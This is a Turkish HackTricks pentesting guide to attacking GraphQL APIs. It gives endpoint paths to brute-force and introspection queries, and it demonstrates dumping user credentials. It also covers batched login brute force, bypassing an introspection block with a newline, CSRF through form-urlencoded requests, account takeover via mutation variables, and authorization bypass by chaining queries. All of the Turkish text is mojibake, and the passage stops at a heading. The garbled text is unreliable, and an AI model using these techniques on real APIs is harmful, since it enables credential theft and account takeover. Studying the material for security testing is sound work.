# GraphQL

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## GiriÅŸ

GraphQL, backend'den veri sorgulamak iÃ§in basitleÅŸtirilmiÅŸ bir yaklaÅŸÄ±m sunan **REST API'ye etkili bir alternatif** olarak vurgulanmaktadÄ±r. REST'in aksine, verileri toplamak iÃ§in genellikle Ã§eÅŸitli uÃ§ noktalarda birÃ§ok istek gerektiren GraphQL, tÃ¼m gerekli bilgilerin **tek bir istek** aracÄ±lÄ±ÄŸÄ±yla alÄ±nmasÄ±nÄ± saÄŸlar. Bu basitleÅŸtirme, veri alÄ±m sÃ¼reÃ§lerinin karmaÅŸÄ±klÄ±ÄŸÄ±nÄ± azaltarak geliÅŸtiricilere Ã¶nemli Ã¶lÃ§Ã¼de **fayda saÄŸlar**.

## GraphQL ve GÃ¼venlik

GraphQL gibi yeni teknolojilerin ortaya Ã§Ä±kmasÄ±yla yeni gÃ¼venlik aÃ§Ä±klarÄ± da ortaya Ã§Ä±kmaktadÄ±r. Dikkate alÄ±nmasÄ± gereken Ã¶nemli bir nokta, **GraphQL'in varsayÄ±lan olarak kimlik doÄŸrulama mekanizmalarÄ±nÄ± iÃ§ermediÄŸidir**. Bu tÃ¼r gÃ¼venlik Ã¶nlemlerini uygulamak geliÅŸtiricilerin sorumluluÄŸundadÄ±r. DoÄŸru kimlik doÄŸrulama olmadan, GraphQL uÃ§ noktalarÄ± kimlik doÄŸrulamasÄ±z kullanÄ±cÄ±lara hassas bilgileri aÃ§Ä±ÄŸa Ã§Ä±karabilir ve ciddi bir gÃ¼venlik riski oluÅŸturabilir.

### Dizin Kaba Kuvvet SaldÄ±rÄ±larÄ± ve GraphQL

AÃ§Ä±ÄŸa Ã§Ä±karÄ±lmÄ±ÅŸ GraphQL Ã¶rneklerini tanÄ±mlamak iÃ§in dizin kaba kuvvet saldÄ±rÄ±larÄ±nda belirli yollarÄ±n dahil edilmesi Ã¶nerilir. Bu yollar ÅŸunlardÄ±r:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

AÃ§Ä±k GraphQL Ã¶rneklerinin tanÄ±mlanmasÄ±, desteklenen sorgularÄ±n incelenmesine olanak tanÄ±r. Bu, uÃ§ noktadan eriÅŸilebilen verileri anlamak iÃ§in Ã¶nemlidir. GraphQL'in iÃ§gÃ¶rÃ¼ sistemi, bir ÅŸemanÄ±n desteklediÄŸi sorgularÄ± detaylandÄ±rarak bunu kolaylaÅŸtÄ±rÄ±r. Daha fazla bilgi iÃ§in GraphQL belgelerindeki iÃ§gÃ¶rÃ¼ye bakÄ±n: [**GraphQL: API'ler iÃ§in bir sorgu dili.**](https://graphql.org/learn/introspection/)

### Parmak Ä°zi

[**graphw00f**](https://github.com/dolevf/graphw00f) aracÄ±, bir sunucuda kullanÄ±lan GraphQL motorunu tespit edebilir ve ardÄ±ndan gÃ¼venlik denetÃ§isi iÃ§in bazÄ± yararlÄ± bilgileri yazdÄ±rabilir.

#### Evrensel sorgular <a href="#universal-queries" id="universal-queries"></a>

Bir URL'nin bir GraphQL servisi olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in bir **evrensel sorgu**, `query{__typename}`, gÃ¶nderilebilir. YanÄ±t `{"data": {"__typename": "Query"}}` iÃ§eriyorsa, URL'nin bir GraphQL uÃ§ noktasÄ± barÄ±ndÄ±rdÄ±ÄŸÄ±nÄ± doÄŸrular. Bu yÃ¶ntem, sorgulanan nesnenin tÃ¼rÃ¼nÃ¼ ortaya koyan GraphQL'in `__typename` alanÄ±na dayanÄ±r.
```javascript
query{__typename}
```
### Temel NumaralandÄ±rma

Graphql genellikle **GET**, **POST** (x-www-form-urlencoded) ve **POST**(json) destekler. GÃ¼venlik aÃ§Ä±sÄ±ndan CSRF saldÄ±rÄ±larÄ±nÄ± Ã¶nlemek iÃ§in yalnÄ±zca json'a izin vermek Ã¶nerilir.

#### Ä°Ã§gÃ¶rÃ¼

Åema bilgilerini keÅŸfetmek iÃ§in iÃ§gÃ¶rÃ¼yÃ¼ kullanmak iÃ§in `__schema` alanÄ±nÄ± sorgulayÄ±n. Bu alan, tÃ¼m sorgularÄ±n kÃ¶k tÃ¼rÃ¼nde mevcuttur.
```bash
query={__schema{types{name,fields{name}}}}
```
Bu sorgu ile kullanÄ±lan tÃ¼m tiplerin adÄ±nÄ± bulacaksÄ±nÄ±z:

![](<../../.gitbook/assets/image (1036).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Bu sorgu ile tÃ¼m tipleri, alanlarÄ±nÄ± ve argÃ¼manlarÄ±nÄ± (ve argÃ¼manlarÄ±n tÃ¼rÃ¼nÃ¼) Ã§Ä±karabilirsiniz. VeritabanÄ±nÄ± sorgulamanÄ±n nasÄ±l yapÄ±lacaÄŸÄ±nÄ± bilmek Ã§ok faydalÄ± olacaktÄ±r.

![](<../../.gitbook/assets/image (950).png>)

**Hatalar**

**HatalarÄ±n** gÃ¶sterilip gÃ¶sterilmeyeceÄŸini bilmek ilginÃ§ olacaktÄ±r, Ã§Ã¼nkÃ¼ bunlar faydalÄ± **bilgiler** saÄŸlayabilir.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
**VeritabanÄ± ÅemasÄ±nÄ± TanÄ±mlama YÃ¶ntemi ile SÄ±ralama**

{% hint style="info" %}
EÄŸer tanÄ±mlama etkinleÅŸtirilmiÅŸse ancak yukarÄ±daki sorgu Ã§alÄ±ÅŸmÄ±yorsa, sorgu yapÄ±sÄ±ndan `onOperation`, `onFragment` ve `onField` direktiflerini kaldÄ±rmayÄ± deneyin.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
SatÄ±r iÃ§i denetim sorgusu:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
### Sorgulama

VeritabanÄ±nda hangi tÃ¼r bilgilerin saklandÄ±ÄŸÄ±nÄ± bildiÄŸimize gÃ¶re, **bazÄ± deÄŸerler Ã§Ä±karmaya** Ã§alÄ±ÅŸalÄ±m.

Ä°ntrospeksiyonda **doÄŸrudan sorgulayabileceÄŸiniz nesneleri** bulabilirsiniz (bir nesneyi sorgulayamazsÄ±nÄ±z Ã§Ã¼nkÃ¼ var olduÄŸu iÃ§in). AÅŸaÄŸÄ±daki gÃ¶rÃ¼ntÃ¼de "_queryType_" olarak adlandÄ±rÄ±lan "_Query_" olduÄŸunu ve "_Query_" nesnesinin alanlarÄ±ndan birinin "_flags_" olduÄŸunu gÃ¶rebilirsiniz, bu alan da bir nesne tÃ¼rÃ¼ndedir. DolayÄ±sÄ±yla bayrak nesnesini sorgulayabilirsiniz.

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-17-48.png>)

Sorgunun tÃ¼rÃ¼nÃ¼n "_flags_" olduÄŸuna dikkat edin ve bu nesnenin aÅŸaÄŸÄ±daki gibi tanÄ±mlandÄ±ÄŸÄ±nÄ± gÃ¶rebilirsiniz:

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-22-57 (1).png>)

"_Flags_" nesnelerinin **isim** ve **deÄŸer** tarafÄ±ndan oluÅŸturulduÄŸunu gÃ¶rebilirsiniz. Sonra bayraklarÄ±n tÃ¼m isimlerini ve deÄŸerlerini aÅŸaÄŸÄ±daki sorgu ile alabilirsiniz:
```javascript
query={flags{name, value}}
```
Not: EÄŸer sorgulanacak nesne bir **ilkel tÃ¼r** gibi **dize** ise aÅŸaÄŸÄ±daki Ã¶rnekte olduÄŸu gibi

![](<../../.gitbook/assets/image (958).png>)

Sadece ÅŸu ÅŸekilde sorgulayabilirsiniz:
```javascript
query={hiddenFlags}
```
BaÅŸka bir Ã¶rnekte, "_Query_" tÃ¼rÃ¼ nesnesi iÃ§inde 2 nesne bulundu: "_user_" ve "_users_".\
Bu nesnelerin aranmasÄ± iÃ§in herhangi bir argÃ¼mana ihtiyaÃ§ duymadÄ±klarÄ± durumda, istediÄŸiniz verileri sormak suretiyle **tÃ¼m bilgileri alabilirsiniz**. Bu Ã¶rnekte Ä°nternet'ten kaydedilmiÅŸ kullanÄ±cÄ± adlarÄ±nÄ± ve ÅŸifreleri Ã§Ä±karabilirsiniz:

![](<../../.gitbook/assets/image (880).png>)

Ancak, bu Ã¶rnekte bunu denerseniz ÅŸu **hatayÄ±** alÄ±rsÄ±nÄ±z:

![](<../../.gitbook/assets/image (1042).png>)

GÃ¶rÃ¼nÃ¼ÅŸe gÃ¶re, "_**uid**_" tÃ¼rÃ¼nde bir argÃ¼man kullanarak arama yapacak gibi gÃ¶rÃ¼nÃ¼yor.\
Neyse ki, zaten [Temel NumaralandÄ±rma](graphql.md#basic-enumeration) bÃ¶lÃ¼mÃ¼nde bize gereken tÃ¼m bilgileri gÃ¶steren bir sorgu Ã¶nerilmiÅŸti: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

EÄŸer o sorguyu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mda saÄŸlanan resmi okursanÄ±z, "_**user**_"'Ä±n _Int_ tÃ¼rÃ¼nde "_**uid**_" argÃ¼manÄ±na sahip olduÄŸunu gÃ¶receksiniz.

Bu nedenle, hafif bir _**uid**_ bruteforce gerÃ§ekleÅŸtirerek _**uid**=**1**_ iÃ§in bir kullanÄ±cÄ± adÄ± ve ÅŸifre elde ettim:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (90).png>)

Dikkat edin ki, "_**user**_" ve "_**password**_" parametrelerini isteyebileceÄŸimi **keÅŸfettim** Ã§Ã¼nkÃ¼ eÄŸer var olmayan bir ÅŸey aramaya Ã§alÄ±ÅŸÄ±rsam (`query={user(uid:1){noExists}}`) bu hatayÄ± alÄ±rÄ±m:

![](<../../.gitbook/assets/image (707).png>)

Ve **numaralandÄ±rma aÅŸamasÄ±** sÄ±rasÄ±nda "_**dbuser**_" nesnesinin "_**user**_" ve "_**password**_" alanlarÄ±na sahip olduÄŸunu keÅŸfettim.

**Sorgu dizesi dÃ¶kme hilesi (teÅŸekkÃ¼rler @BinaryShadow\_)**

EÄŸer bir dize tÃ¼rÃ¼yle arama yapabilirseniz, Ã¶rneÄŸin: `query={theusers(description: ""){username,password}}` ve bir boÅŸ dize iÃ§in arama yaparsanÄ±z tÃ¼m verileri dÃ¶kecektir. (_Bu Ã¶rnek, Ã¶ÄŸreticilerin Ã¶rneÄŸiyle ilgili deÄŸildir, bu Ã¶rnekte bir String alanÄ± olan "**description**" ile "**theusers**" kullanarak arama yapabileceÄŸinizi varsayalÄ±m_).

### Arama

Bu kurulumda, bir **veritabanÄ±** kiÅŸileri ve filmleri iÃ§erir. **KiÅŸiler** e-posta ve isimleriyle tanÄ±mlanÄ±r; filmler ise adlarÄ± ve derecelendirmeleriyle. **KiÅŸiler** birbirleriyle arkadaÅŸ olabilir ve ayrÄ±ca filmlere sahip olabilir, veritabanÄ± iÃ§indeki iliÅŸkileri gÃ¶sterir.

KiÅŸileri **isimlerine gÃ¶re** arayabilir ve e-postalarÄ±nÄ± alabilirsiniz:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
KiÅŸileri **adlarÄ±na gÃ¶re** arayabilir ve **abone olduklarÄ± filmleri** alabilirsiniz:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Not alÄ±nan kiÅŸinin `aboneFilmler`'in `adÄ±` alÄ±nmasÄ± belirtilmiÅŸtir.

AyrÄ±ca **aynÄ± anda birkaÃ§ nesne aranabilir**. Bu durumda, 2 film aramasÄ± yapÄ±lÄ±r:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Ya da hatta **farklÄ± nesnelerin iliÅŸkileri, takma adlar kullanÄ±larak**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutations

**Mutations, sunucu tarafÄ±nda deÄŸiÅŸiklik yapmak iÃ§in kullanÄ±lÄ±r.**

**Introspection** iÃ§inde **tanÄ±mlanmÄ±ÅŸ mutasyonlarÄ±** bulabilirsiniz. AÅŸaÄŸÄ±daki gÃ¶rÃ¼ntÃ¼de "_MutationType_" "_Mutation_" olarak adlandÄ±rÄ±lÄ±r ve "_Mutation_" nesnesi mutasyonlarÄ±n isimlerini iÃ§erir (bu durumda "_addPerson_" gibi):

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-26-27 (1).png>)

Bu yapÄ±da bir **veritabanÄ±**, **kiÅŸileri** ve **filmleri** iÃ§erir. **KiÅŸiler**, **e-posta** ve **isimleri** ile tanÄ±mlanÄ±r; **filmler** ise **isim** ve **puanlarÄ±** ile tanÄ±mlanÄ±r. **KiÅŸiler** birbirleriyle arkadaÅŸ olabilir ve ayrÄ±ca filmlere sahip olabilir, veritabanÄ± iÃ§indeki iliÅŸkileri gÃ¶sterir.

VeritabanÄ±na **yeni filmler eklemek** iÃ§in bir mutasyon aÅŸaÄŸÄ±daki gibi olabilir (bu Ã¶rnekte mutasyon `addMovie` olarak adlandÄ±rÄ±lmÄ±ÅŸtÄ±r):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Sorguda hem verilerin hem de veri tÃ¼rÃ¼nÃ¼n belirtildiÄŸine dikkat edin.**

AyrÄ±ca, veritabanÄ± mevcut **arkadaÅŸlar** ve **filmler** ile iliÅŸkilendirilmiÅŸ **kiÅŸilerin** oluÅŸturulmasÄ±na izin veren `addPerson` adÄ±nda bir **mutasyon** iÅŸlemini destekler. ArkadaÅŸlar ve filmlerin, yeni oluÅŸturulan kiÅŸiye baÄŸlanmadan Ã¶nce veritabanÄ±nda Ã¶nceden var olmasÄ± gerektiÄŸi Ã¶nemlidir.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### YÃ¶nerge AÅŸÄ±rÄ± YÃ¼kleme

[**Bu raporda aÃ§Ä±klanan zafiyetlerden birinde**](https://www.landh.tech/blog/20240304-google-hack-50000/) aÃ§Ä±klandÄ±ÄŸÄ± gibi, bir yÃ¶nerge aÅŸÄ±rÄ± yÃ¼kleme, sunucunun iÅŸlemleri boÅŸa harcayacak ÅŸekilde bir yÃ¶nergeyi milyonlarca kez Ã§aÄŸÄ±rma anlamÄ±na gelir ve DoS saldÄ±rÄ±sÄ± yapÄ±labilir hale gelene kadar devam etmektedir.

### 1 API isteÄŸinde toplu kaba kuvvet saldÄ±rÄ±sÄ±

Bu bilgi [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/) adresinden alÄ±nmÄ±ÅŸtÄ±r.\
**FarklÄ± kimlik bilgileri ile birlikte birÃ§ok sorguyu aynÄ± anda gÃ¶ndererek kimlik doÄŸrulama**. Kontrol etmek iÃ§in. Bu klasik bir kaba kuvvet saldÄ±rÄ±sÄ±dÄ±r, ancak ÅŸimdi GraphQL toplu iÅŸleme Ã¶zelliÄŸi sayesinde HTTP isteÄŸi baÅŸÄ±na birden fazla giriÅŸ/ÅŸifre Ã§ifti gÃ¶ndermek mÃ¼mkÃ¼ndÃ¼r. Bu yaklaÅŸÄ±m, harici hÄ±z izleme uygulamalarÄ±nÄ± tÃ¼mÃ¼nÃ¼n iyi olduÄŸunu ve ÅŸifreleri tahmin etmeye Ã§alÄ±ÅŸan bir kaba kuvvet botunun olmadÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼nmelerine kandÄ±rabilir.

AÅŸaÄŸÄ±da, **aynÄ± anda 3 farklÄ± e-posta/ÅŸifre Ã§ifti** ile uygulama kimlik doÄŸrulama isteÄŸinin en basit gÃ¶sterimi bulunmaktadÄ±r. AÃ§Ä±kÃ§a, aynÄ± ÅŸekilde tek bir istekte binlerce gÃ¶ndermek mÃ¼mkÃ¼ndÃ¼r:

![](<../../.gitbook/assets/image (1081).png>)

YanÄ±t ekran gÃ¶rÃ¼ntÃ¼sÃ¼nden gÃ¶rebileceÄŸimiz gibi, ilk ve Ã¼Ã§Ã¼ncÃ¼ istekler _null_ dÃ¶ndÃ¼rdÃ¼ ve ilgili bilgileri _error_ bÃ¶lÃ¼mÃ¼nde yansÄ±ttÄ±. **Ä°kinci mutasyon doÄŸru kimlik doÄŸrulama** verilerine sahipti ve yanÄ±t doÄŸru kimlik doÄŸrulama oturum belirteci iÃ§eriyordu.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL Ä°ntrospeksiyon Olmadan

Daha fazla **graphql uÃ§ noktasÄ± introspeksiyonu devre dÄ±ÅŸÄ± bÄ±rakÄ±yor**. Bununla birlikte, graphql'in beklenmeyen bir istek aldÄ±ÄŸÄ±nda fÄ±rlattÄ±ÄŸÄ± hatalar, [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) gibi araÃ§lar iÃ§in ÅŸemayÄ± yeniden oluÅŸturmak iÃ§in yeterlidir.

AyrÄ±ca, Burp Suite uzantÄ±sÄ± [**GraphQuail**](https://github.com/forcesunseen/graphquail) uzantÄ±sÄ±, Burp Ã¼zerinden geÃ§en GraphQL API isteklerini **izler** ve her yeni sorguyu gÃ¶rdÃ¼ÄŸÃ¼nde iÃ§sel bir GraphQL **ÅŸemasÄ± oluÅŸturur**. AyrÄ±ca ÅŸemayÄ± GraphiQL ve Voyager iÃ§in aÃ§Ä±ÄŸa Ã§Ä±karabilir. UzantÄ±, bir introspeksiyon sorgusu aldÄ±ÄŸÄ±nda sahte bir yanÄ±t dÃ¶ndÃ¼rÃ¼r. SonuÃ§ olarak, GraphQuail API iÃ§inde kullanÄ±labilecek tÃ¼m sorgularÄ±, argÃ¼manlarÄ± ve alanlarÄ± gÃ¶sterir. Daha fazla bilgi iÃ§in [**buraya bakÄ±n**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

[**GraphQL varlÄ±klarÄ±nÄ± keÅŸfetmek iÃ§in gÃ¼zel bir kelime listesi burada bulunabilir**](https://github.com/Escape-Technologies/graphql-wordlist?).

### GraphQL Ä°ntrospeksiyon SavunmalarÄ±nÄ± Atlatma <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

### **GraphQL Ä°ntrospeksiyon SavunmalarÄ±nÄ± Atlatma**

API'lerde introspeksiyon sorgularÄ±na getirilen kÄ±sÄ±tlamalarÄ± atlamak iÃ§in, `__schema` kelimesinden sonra **Ã¶zel bir karakter eklemek** etkili olmaktadÄ±r. Bu yÃ¶ntem, introspeksiyonu engellemeyi amaÃ§layan regex desenlerinde yaygÄ±n geliÅŸtirici hatalarÄ±nÄ± sÃ¶mÃ¼rÃ¼r. `__schema` kelimesine odaklanan regex desenlerinde hesaba katÄ±lmayan ancak GraphQL'in gÃ¶rmezden geldiÄŸi karakterlerin eklenmesiyle, kÄ±sÄ±tlamalar atlatÄ±labilir. Ã–rneÄŸin, `__schema`'dan sonra bir satÄ±r sonu ekleyen bir introspeksiyon sorgusu, bu tÃ¼r savunmalarÄ± atlayabilir:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
EÄŸer baÅŸarÄ±sÄ±z olursanÄ±z, yalnÄ±zca POST isteklerine kÄ±sÄ±tlamalar uygulanmÄ±ÅŸ olabileceÄŸinden **GET istekleri** veya **`x-www-form-urlencoded` ile POST** gibi alternatif istek yÃ¶ntemlerini dÃ¼ÅŸÃ¼nebilirsiniz.

### **AÃ§Ä±ÄŸa Ã‡Ä±karÄ±lmÄ±ÅŸ GraphQL YapÄ±larÄ±nÄ± KeÅŸfetme**

Ä°ntrospeksiyon devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ±nda, JavaScript kÃ¼tÃ¼phanelerinde Ã¶nceden yÃ¼klenmiÅŸ sorgularÄ± incelemek yararlÄ± bir stratejidir. Bu sorgular, geliÅŸtirici araÃ§larÄ±ndaki `Kaynaklar` sekmesi kullanÄ±larak bulunabilir, API'nin ÅŸemasÄ±na dair iÃ§gÃ¶rÃ¼ler saÄŸlayabilir ve potansiyel olarak **aÃ§Ä±ÄŸa Ã§Ä±karÄ±lmÄ±ÅŸ hassas sorgularÄ±** ortaya Ã§Ä±karabilir. GeliÅŸtirici araÃ§larÄ± iÃ§inde arama yapmak iÃ§in kullanÄ±lan komutlar:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## GraphQL'de CSRF

CSRF nedir bilmiyorsanÄ±z aÅŸaÄŸÄ±daki sayfayÄ± okuyun:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

DÄ±ÅŸarÄ±da, **CSRF tokenlarÄ± olmadan yapÄ±landÄ±rÄ±lmÄ±ÅŸ** birkaÃ§ GraphQL uÃ§ noktasÄ± bulabileceksiniz.

GraphQL istekleri genellikle **`application/json`** Content-Type kullanÄ±larak POST istekleri aracÄ±lÄ±ÄŸÄ±yla gÃ¶nderilir.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Ancak, Ã§oÄŸu GraphQL uÃ§ noktasÄ± ayrÄ±ca **`form-urlencoded` POST isteklerini de destekler:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Bu nedenle, Ã¶nceki istekler gibi CSRF istekleri **Ã¶niÅŸlem isteÄŸi olmadan** gÃ¶nderildiÄŸinden, bir CSRF'yi istismar ederek GraphQL'de **deÄŸiÅŸiklikler** yapmak mÃ¼mkÃ¼ndÃ¼r.

Ancak, Chrome'un `samesite` bayraÄŸÄ±nÄ±n yeni varsayÄ±lan Ã§erez deÄŸeri `Lax`'tir. Bu, Ã§erezin yalnÄ±zca Ã¼Ã§Ã¼ncÃ¼ taraf web sitelerinden GET isteklerinde gÃ¶nderileceÄŸi anlamÄ±na gelir.

GraphQL uÃ§ noktasÄ±ndan iÃ§erik sÄ±zdÄ±rmak iÃ§in [**XS-Search**](../../pentesting-web/xs-search/) **saldÄ±rÄ±sÄ±nÄ±** istismar etmek de mÃ¼mkÃ¼n olabilir ve kullanÄ±cÄ±nÄ±n kimlik bilgilerini istismar edebilir.

Daha fazla bilgi iÃ§in [**buradaki orijinal yazÄ±ya**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html) bakÄ±n.

## GraphQL'de Yetkilendirme

UÃ§ noktada tanÄ±mlanan birÃ§ok GraphQL iÅŸlevi, yalnÄ±zca istekte bulunanÄ±n kimlik doÄŸrulamasÄ±nÄ± kontrol edebilir ancak yetkilendirmeyi kontrol etmeyebilir.

Sorgu giriÅŸ deÄŸiÅŸkenlerini deÄŸiÅŸtirmek, hassas hesap ayrÄ±ntÄ±larÄ±na yol aÃ§abilir [sÄ±zdÄ±rÄ±lmÄ±ÅŸ](https://hackerone.com/reports/792927).

Mutasyon, baÅŸka bir hesap verisini deÄŸiÅŸtirmeye Ã§alÄ±ÅŸarak hesap ele geÃ§irmesine bile yol aÃ§abilir.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### GraphQL'de Yetkilendirme Atlatma

[Query'leri zincirleme](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) zayÄ±f bir kimlik doÄŸrulama sistemini atlayabilir.

AÅŸaÄŸÄ±daki Ã¶rnekte iÅŸlemin "forgotPassword" olduÄŸunu ve yalnÄ±zca onunla iliÅŸkili forgotPassword sorgusunun yÃ¼rÃ¼tÃ¼lmesi gerektiÄŸini gÃ¶rebilirsiniz. Bu, sona bir sorgu ekleyerek atlatÄ±labilir, bu durumda "register" ve sisteme yeni bir kullanÄ±cÄ± olarak kaydedilmesi iÃ§in bir kullanÄ±cÄ± deÄŸiÅŸkeni ekliyoruz.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## GraphQL'de Aliases Kullanarak SÄ±nÄ±rÄ± Atlatma

